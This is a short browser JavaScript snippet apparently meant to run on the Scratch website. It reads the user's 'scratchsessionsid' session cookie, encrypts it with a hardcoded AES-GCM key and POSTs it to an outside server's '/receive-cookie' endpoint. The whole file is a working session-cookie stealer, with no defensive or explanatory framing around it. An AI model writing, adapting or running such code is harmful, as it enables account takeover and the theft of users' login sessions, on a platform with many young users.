(async function() {
    // Function to get the value of a specified cookie
    function getCookieValue(cookieName) {
        const name = cookieName + "=";
        const decodedCookie = decodeURIComponent(document.cookie);
        const cookiesArray = decodedCookie.split(';');
        for (let cookie of cookiesArray) {
            cookie = cookie.trim();
            if (cookie.indexOf(name) === 0) {
                return cookie.substring(name.length);
            }
        }
        return "";
    }

    // Function to encrypt data
    async function encryptData(key, data) {
        const encoder = new TextEncoder();
        const encodedData = encoder.encode(data);

        // Generate a random initialization vector (IV)
        const iv = crypto.getRandomValues(new Uint8Array(12));

        // Encrypt data
        const encryptedData = await crypto.subtle.encrypt(
            {
                name: "AES-GCM",
                iv: iv
            },
            key,
            encodedData
        );

        return { iv, encryptedData };
    }

    // Function to encode ArrayBuffer to Base64
    function arrayBufferToBase64(buffer) {
        let binary = '';
        const bytes = new Uint8Array(buffer);
        for (let byte of bytes) {
            binary += String.fromCharCode(byte);
        }
        return window.btoa(binary);
    }

    // Function to decode Base64 to ArrayBuffer
    function base64ToArrayBuffer(base64) {
        const binaryString = window.atob(base64);
        const len = binaryString.length;
        const bytes = new Uint8Array(len);
        for (let i = 0; i < len; i++) {
            bytes[i] = binaryString.charCodeAt(i);
        }
        return bytes.buffer;
    }

    // Get the value of the 'scratchsessionsid' cookie
    const scratchSessionId = getCookieValue('scratchsessionsid');

    // Your predefined key (Base64 encoded)
    const keyBase64 = 'RDO6wE9k1bedbIoCsVM0w7/YHfBmjWtJsCPVS5MQpOM='; // Replace with your actual Base64 encoded key
    const keyBuffer = base64ToArrayBuffer(keyBase64);

    // Import the key
    const key = await crypto.subtle.importKey(
        'raw',
        keyBuffer,
        'AES-GCM',
        false,
        ['encrypt', 'decrypt']
    );

    // Encrypt the data
    const { iv, encryptedData } = await encryptData(key, scratchSessionId);

    // Convert encrypted data and IV to Base64
    const ivBase64 = arrayBufferToBase64(iv);
    const encryptedDataBase64 = arrayBufferToBase64(encryptedData);

    // Send encrypted data to the server
    try {
        const response = await fetch('https://10.0.103.59:3000/receive-cookie', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({ 
                iv: ivBase64,
                data: encryptedDataBase64 
            }),
        });

        if (!response.ok) {
            throw new Error('Network response was not ok');
        }

        const responseData = await response.json();
        console.log('Cookie sent successfully:', responseData);
    } catch (error) {
        console.error('Error sending cookie:', error);
    }
})();
